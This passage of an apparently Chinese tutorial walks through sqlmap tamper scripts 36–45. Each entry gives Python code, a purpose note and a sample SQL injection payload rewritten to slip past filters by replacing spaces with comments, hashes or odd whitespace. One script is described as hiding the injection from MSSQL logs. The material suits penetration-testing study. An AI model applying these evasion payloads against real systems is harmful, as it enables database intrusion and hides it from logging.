<h2 id="36-sp-password-py"><a href="#36-sp-password-py" class="headerlink" title="36.sp_password.py"></a>36.sp_password.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;%s%ssp_password&quot;</span> % (payload, <span class="hljs-string">&quot;-- &quot;</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">if</span> _ <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&quot;-- &quot;</span>)) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将（MsSQL）函数“sp-password”发送到payload的末尾，以便从DBMS日志中进行自动模糊处理，用于迷惑数据库日志"><a href="#1-作用：将（MsSQL）函数“sp-password”发送到payload的末尾，以便从DBMS日志中进行自动模糊处理，用于迷惑数据库日志" class="headerlink" title="1.作用：将（MsSQL）函数“sp_password”发送到payload的末尾，以便从DBMS日志中进行自动模糊处理，用于迷惑数据库日志"></a>1.作用：将（MsSQL）函数“sp_password”发送到payload的末尾，以便从DBMS日志中进行自动模糊处理，用于迷惑数据库日志</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1 <span class="hljs-keyword">AND</span> <span class="hljs-attribute">9227</span>=9227--<br>-----&gt;<br>1 <span class="hljs-keyword">AND</span> <span class="hljs-attribute">9227</span>=9227-- sp_password<br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-13"><a href="#2-要求：-13" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MSSQL<br></code></pre></td></tr></table></figure>




<h2 id="37-space2comment-py"><a href="#37-space2comment-py" class="headerlink" title="37.space2comment.py"></a>37.space2comment.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>            <span class="hljs-keyword">if</span> payload[i].isspace():<br>                firstspace = <span class="hljs-literal">True</span><br>                retVal += <span class="hljs-string">&quot;/**/&quot;</span><br>                <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>            quote = <span class="hljs-keyword">not</span> quote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>            doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>            retVal += <span class="hljs-string">&quot;/**/&quot;</span><br>            <span class="hljs-keyword">continue</span><br><br>        retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用-替代空格，用于空格的绕过"><a href="#1-作用：用-替代空格，用于空格的绕过" class="headerlink" title="1.作用：用 /**/ 替代空格，用于空格的绕过"></a>1.作用：用 <code>/**/</code> 替代空格，用于空格的绕过</h3><h2 id="38-space2dash-py"><a href="#38-space2dash-py" class="headerlink" title="38.space2dash.py"></a>38.space2dash.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> payload[i].isspace():<br>            randomStr = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(random.randint(<span class="hljs-number">6</span>, <span class="hljs-number">12</span>)))<br>            retVal += <span class="hljs-string">&quot;--%s%%0A&quot;</span> % randomStr<br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">or</span> payload[i:i + <span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-- &#x27;</span>:<br>            retVal += payload[i:]<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用将空格字符（’-‘）替换为短划线注释（’–’），后跟随机字符串和换行符（’-n’）"><a href="#1-作用将空格字符（’-‘）替换为短划线注释（’–’），后跟随机字符串和换行符（’-n’）" class="headerlink" title="1.作用将空格字符（’ ‘）替换为短划线注释（’–’），后跟随机字符串和换行符（’\n’）"></a>1.作用将空格字符（’ ‘）替换为短划线注释（’–’），后跟随机字符串和换行符（’\n’）</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1 <span class="hljs-keyword">AND</span> <span class="hljs-attribute">9227</span>=9227<br>-------&gt;<br>1--nVNaVoPYeva%0AAND--ngNvzqu%<span class="hljs-attribute">0A9227</span>=9227<br></code></pre></td></tr></table></figure>


<h3 id="2-要求：-14"><a href="#2-要求：-14" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Requirement:<br><span class="hljs-bullet">    *</span> MSSQL<br><span class="hljs-bullet">    *</span> SQLite<br></code></pre></td></tr></table></figure>


<h2 id="39-space2hash-py"><a href="#39-space2hash-py" class="headerlink" title="39.space2hash.py"></a>39.space2hash.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> payload[i].isspace():<br>            randomStr = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(random.randint(<span class="hljs-number">6</span>, <span class="hljs-number">12</span>)))<br>            retVal += <span class="hljs-string">&quot;%%23%s%%0A&quot;</span> % randomStr<br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">or</span> payload[i:i + <span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-- &#x27;</span>:<br>            retVal += payload[i:]<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将（MySQL）空格字符（’-‘）的实例替换为一个磅字符（’-’），后跟一个随机字符串和一个换行（’-n’）"><a href="#1-作用：将（MySQL）空格字符（’-‘）的实例替换为一个磅字符（’-’），后跟一个随机字符串和一个换行（’-n’）" class="headerlink" title="1.作用：将（MySQL）空格字符（’ ‘）的实例替换为一个磅字符（’#’），后跟一个随机字符串和一个换行（’\n’）"></a>1.作用：将（MySQL）空格字符（’ ‘）的实例替换为一个磅字符（’#’），后跟一个随机字符串和一个换行（’\n’）</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span> AND <span class="hljs-number">9227</span><span class="hljs-operator">=</span><span class="hljs-number">9227</span><br>---&gt;<br><span class="hljs-number">1</span><span class="hljs-variable">%23</span>nVNaVoPYeva<span class="hljs-variable">%0</span>AAND<span class="hljs-variable">%23</span>ngNvzqu<span class="hljs-variable">%0</span>A<span class="hljs-number">9227</span><span class="hljs-operator">=</span><span class="hljs-number">9227</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求"><a href="#2-要求" class="headerlink" title="2.要求"></a>2.要求</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL<br></code></pre></td></tr></table></figure>




<h2 id="40-space2morecomment-py"><a href="#40-space2morecomment-py" class="headerlink" title="40.space2morecomment.py"></a>40.space2morecomment.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>            <span class="hljs-keyword">if</span> payload[i].isspace():<br>                firstspace = <span class="hljs-literal">True</span><br>                retVal += <span class="hljs-string">&quot;/**_**/&quot;</span><br>                <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>            quote = <span class="hljs-keyword">not</span> quote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>            doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>            retVal += <span class="hljs-string">&quot;/**_**/&quot;</span><br>            <span class="hljs-keyword">continue</span><br><br>        retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将’-‘空格字符换成"><a href="#1-作用：将’-‘空格字符换成" class="headerlink" title="1.作用：将’ ‘空格字符换成/**_**/"></a>1.作用：将’ ‘空格字符换成<code>/**_**/</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users<br><br><span class="hljs-comment">-----&gt;</span><br><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**_**/</span>id<span class="hljs-comment">/**_**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**_**/</span>users<br></code></pre></td></tr></table></figure>




<h2 id="42-space2morehash-py"><a href="#42-space2morehash-py" class="headerlink" title="42.space2morehash.py"></a>42.space2morehash.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> payload:<br>    payload = re.sub(<span class="hljs-string">r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;</span>, <span class="hljs-keyword">lambda</span> match: process(match), payload)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> payload[i].isspace():<br>            randomStr = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(random.randint(<span class="hljs-number">6</span>, <span class="hljs-number">12</span>)))<br>            retVal += <span class="hljs-string">&quot;%%23%s%%0A&quot;</span> % randomStr<br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">or</span> payload[i:i + <span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-- &#x27;</span>:<br>            retVal += payload[i:]<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将（MySQL）空格字符（’-‘）的实例替换为一个磅字符（’-’），后跟一个随机字符串和一个换行（’-n’）-1"><a href="#1-作用：将（MySQL）空格字符（’-‘）的实例替换为一个磅字符（’-’），后跟一个随机字符串和一个换行（’-n’）-1" class="headerlink" title="1.作用：将（MySQL）空格字符（’ ‘）的实例替换为一个磅字符（’#’），后跟一个随机字符串和一个换行（’\n’）"></a>1.作用：将（MySQL）空格字符（’ ‘）的实例替换为一个磅字符（’#’），后跟一个随机字符串和一个换行（’\n’）</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span> AND <span class="hljs-number">9227</span><span class="hljs-operator">=</span><span class="hljs-number">9227</span><br>--------&gt;<br><span class="hljs-number">1</span><span class="hljs-variable">%23</span>ngNvzqu<span class="hljs-variable">%0</span>AAND<span class="hljs-variable">%23</span>nVNaVoPYeva<span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span>lujYFWfv<span class="hljs-variable">%0</span>A<span class="hljs-number">9227</span><span class="hljs-operator">=</span><span class="hljs-number">9227</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-15"><a href="#2-要求：-15" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL &gt;= 5.1.13<br></code></pre></td></tr></table></figure>




<h2 id="43-space2mssqlblank-py"><a href="#43-space2mssqlblank-py" class="headerlink" title="43.space2mssqlblank.py"></a>43.space2mssqlblank.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python">blanks = (<span class="hljs-string">&#x27;%01&#x27;</span>, <span class="hljs-string">&#x27;%02&#x27;</span>, <span class="hljs-string">&#x27;%03&#x27;</span>, <span class="hljs-string">&#x27;%04&#x27;</span>, <span class="hljs-string">&#x27;%05&#x27;</span>, <span class="hljs-string">&#x27;%06&#x27;</span>, <span class="hljs-string">&#x27;%07&#x27;</span>, <span class="hljs-string">&#x27;%08&#x27;</span>, <span class="hljs-string">&#x27;%09&#x27;</span>, <span class="hljs-string">&#x27;%0B&#x27;</span>, <span class="hljs-string">&#x27;%0C&#x27;</span>, <span class="hljs-string">&#x27;%0D&#x27;</span>, <span class="hljs-string">&#x27;%0E&#x27;</span>, <span class="hljs-string">&#x27;%0F&#x27;</span>, <span class="hljs-string">&#x27;%0A&#x27;</span>)<br>retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    quote, doublequote, firstspace, end = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>            <span class="hljs-keyword">if</span> payload[i].isspace():<br>                firstspace = <span class="hljs-literal">True</span><br>                retVal += random.choice(blanks)<br>                <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>            quote = <span class="hljs-keyword">not</span> quote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>            doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">or</span> payload[i:i + <span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-- &#x27;</span>:<br>            end = <span class="hljs-literal">True</span><br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>            <span class="hljs-keyword">if</span> end:<br>                retVal += random.choice(blanks[:-<span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">else</span>:<br>                retVal += random.choice(blanks)<br><br>            <span class="hljs-keyword">continue</span><br><br>        retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用以下随机空白符替换-payload-中的空格"><a href="#1-作用：用以下随机空白符替换-payload-中的空格" class="headerlink" title="1.作用：用以下随机空白符替换 payload 中的空格"></a>1.作用：用以下随机空白符替换 payload 中的空格</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># ASCII table:</span><br><span class="hljs-meta">#   SOH     01      start of heading</span><br><span class="hljs-meta">#   STX     02      start of text</span><br><span class="hljs-meta">#   ETX     03      end of text</span><br><span class="hljs-meta">#   EOT     04      end of transmission</span><br><span class="hljs-meta">#   ENQ     05      enquiry</span><br><span class="hljs-meta">#   ACK     06      acknowledge</span><br><span class="hljs-meta">#   BEL     07      bell</span><br><span class="hljs-meta">#   BS      08      backspace</span><br><span class="hljs-meta">#   TAB     09      horizontal tab</span><br><span class="hljs-meta">#   LF      0A      new line</span><br><span class="hljs-meta">#   VT      0B      vertical TAB</span><br><span class="hljs-meta">#   FF      0C      new page</span><br><span class="hljs-meta">#   CR      0D      carriage return</span><br><span class="hljs-meta">#   SO      0E      shift out</span><br><span class="hljs-meta">#   SI      0F      shift in</span><br></code></pre></td></tr></table></figure>


<h3 id="2-要求：-16"><a href="#2-要求：-16" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * Microsoft SQL Server<br></code></pre></td></tr></table></figure>




<h2 id="44-space2mssqlhash-py"><a href="#44-space2mssqlhash-py" class="headerlink" title="44.space2mssqlhash.py"></a>44.space2mssqlhash.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> payload[i].isspace():<br>            retVal += <span class="hljs-string">&quot;%23%0A&quot;</span><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">or</span> payload[i:i + <span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-- &#x27;</span>:<br>            retVal += payload[i:]<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将空格字符替换成’-’并且跟随一个’-n’"><a href="#1-作用：将空格字符替换成’-’并且跟随一个’-n’" class="headerlink" title="1.作用：将空格字符替换成’#’并且跟随一个’\n’"></a>1.作用：将空格字符替换成’#’并且跟随一个’\n’</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span> AND <span class="hljs-number">9227</span><span class="hljs-operator">=</span><span class="hljs-number">9227</span><br>----&gt;<br><span class="hljs-number">1</span><span class="hljs-variable">%23</span><span class="hljs-variable">%0</span>AAND<span class="hljs-variable">%23</span><span class="hljs-variable">%0</span>A<span class="hljs-number">9227</span><span class="hljs-operator">=</span><span class="hljs-number">9227</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-17"><a href="#2-要求：-17" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Requirement:<br><span class="hljs-bullet">    *</span> MSSQL<br><span class="hljs-bullet">    *</span> MySQL<br></code></pre></td></tr></table></figure>




<h2 id="45-space2mysqlblank-py"><a href="#45-space2mysqlblank-py" class="headerlink" title="45.space2mysqlblank.py"></a>45.space2mysqlblank.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">blanks = (<span class="hljs-string">&#x27;%09&#x27;</span>, <span class="hljs-string">&#x27;%0A&#x27;</span>, <span class="hljs-string">&#x27;%0C&#x27;</span>, <span class="hljs-string">&#x27;%0D&#x27;</span>, <span class="hljs-string">&#x27;%0B&#x27;</span>, <span class="hljs-string">&#x27;%A0&#x27;</span>)<br>retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>            <span class="hljs-keyword">if</span> payload[i].isspace():<br>                firstspace = <span class="hljs-literal">True</span><br>                retVal += random.choice(blanks)<br>                <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>            quote = <span class="hljs-keyword">not</span> quote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>            doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>            retVal += random.choice(blanks)<br>            <span class="hljs-keyword">continue</span><br><br>        retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用以下的空白字符随机替换空格"><a href="#1-作用：用以下的空白字符随机替换空格" class="headerlink" title="1.作用：用以下的空白字符随机替换空格"></a>1.作用：用以下的空白字符随机替换空格</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># ASCII table:</span><br><span class="hljs-meta">#   TAB     09      horizontal TAB</span><br><span class="hljs-meta">#   LF      0A      new line</span><br><span class="hljs-meta">#   FF      0C      new page</span><br><span class="hljs-meta">#   CR      0D      carriage return</span><br><span class="hljs-meta">#   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)</span><br><span class="hljs-meta">#           A0      non-breaking space</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-18"><a href="#2-要求：-18" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL<br></code></pre></td></tr></table></figure>




